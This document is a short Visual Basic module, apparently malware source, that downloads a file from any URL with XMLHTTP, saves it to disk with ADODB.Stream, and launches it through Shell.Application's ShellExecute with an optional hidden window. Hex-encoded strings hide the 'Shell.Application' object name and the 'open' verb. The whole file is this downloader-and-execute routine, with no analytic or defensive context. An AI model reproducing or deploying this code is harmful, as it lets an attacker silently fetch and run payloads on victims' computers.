Attribute VB_Name = "iDonwExec"
Option Explicit
Function HyperFiles(strDowload As String, SaveOn As String) As Long
On Error GoTo 1:
Dim xml                     As Object
Dim adoStream               As Object
    Set xml = CreateObject("Microsoft.XMLHTTP")
    Set adoStream = CreateObject("Adodb.Stream")
    Call xml.Open("GET", strDowload, 0)
    Call xml.Send
    adoStream.Type = 1
    Call adoStream.Open
    Call adoStream.write(xml.responseBody)
    Call adoStream.SaveToFile(SaveOn, 2)
    Call adoStream.Close
    HyperFiles = 1
Exit Function
1:
End Function
Function Executes(StringsParche As String, Optional hHiden As Boolean) As Long

Dim CoxRs                     As Object
    Set CoxRs = CreateObject(Desencriptar("5368656C6C2E4170706C69636174696F6E"), "")
    If Not CoxRs Is Nothing Then
        Call CoxRs.ShellExecute(StringsParche, "", "", Desencriptar("6F70656E"), Abs(Not hHiden))
        Executes = 1
    End If
End Function
